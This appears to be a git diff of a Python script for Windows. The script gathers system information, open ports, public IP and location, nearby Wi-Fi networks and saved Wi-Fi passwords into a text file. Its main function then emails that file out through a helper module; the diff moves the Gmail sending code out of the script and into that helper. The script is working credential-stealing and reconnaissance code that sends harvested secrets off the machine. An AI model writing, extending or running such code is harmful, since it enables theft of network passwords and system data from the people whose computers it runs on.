@@ -1,26 +1,17 @@
 import subprocess
 import requests
 from bs4 import BeautifulSoup
-import lxml
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-from auth_data import passw, mail
+from send_mail import send_email
+
 
 
 def system_info() :
     system_data = subprocess.check_output('systeminfo').decode('CP866')
-    print(system_data)
-    with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
-        file.write(f'SYSTEM INFO \n {system_data}\n {"*" * 100}\n ')
-
-
-def ports_info() :
     ports_data = subprocess.check_output('netstat -a').decode('CP866')
+    print(system_data)
     print(ports_data)
     with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
-        file.write(f'\nINFORMATION ABOUT PORTS \n {ports_data} \n {"*" * 100}\n')
+        file.write(f'SYSTEM INFO \n {system_data}\n {"*" * 100}\n \nINFORMATION ABOUT PORTS \n {ports_data} \n {"*" * 100}\n')
 
 
 def check_ip() :
@@ -28,7 +19,7 @@ def check_ip() :
     ip_dns = [i.split(' : ')[0].strip() for i in ip_data if 'Address' in i][1]
     url = 'https://2ip.ru/'
     response = requests.get(url)
-    soup = BeautifulSoup(response.text, 'lxml')
+    soup = BeautifulSoup(response.text, 'html.parser')
     ip = soup.find('div', class_ = 'ip').text.strip()
     location = soup.find('div', class_ = 'value-country').text.strip()
     name_pc = soup.find('div', class_='ip-icon-label').text.strip()
@@ -38,6 +29,10 @@ def check_ip() :
 
 
 def check_wifi():
+    wlan_data = subprocess.check_output('netsh wlan show network').decode('CP866')
+    print(wlan_data)
+    with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
+        file.write(f'WLAN INFO \n {wlan_data}\n ')
     profiles_data = subprocess.check_output('netsh wlan show profiles').decode('CP866').split("\n")
     profiles = [i.split(" : ")[1].strip() for i in profiles_data if 'All User Profile' in i or 'Все профили пользователей' in i]
     for profile in profiles :
@@ -51,30 +46,9 @@ def check_wifi():
             file.write(f'\n Profile: {profile}\nPassword: {password}\n{"#" * 20}')
 
 
-def send_email() :
-    attachment = "check_system.txt"
-    msg = MIMEMultipart()
-    msg['Subject'] = "Report"
-    msg['From'] = mail
-    msg['To'] = mail
-    part = MIMEBase('application', "octet-stream")
-    part.set_payload(open(attachment, "rb").read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition', 'attachment', filename=attachment)
-    msg.attach(part)
-    with smtplib.SMTP('smtp.gmail.com',587) as server:
-       server.ehlo()
-       server.starttls()
-       server.ehlo()
-       server.login(mail, passw)
-       server.send_message(msg)
-       server.quit()
-
-
 def main():
     check_ip()
     system_info()
-    ports_info()
     check_wifi()
     send_email()
 
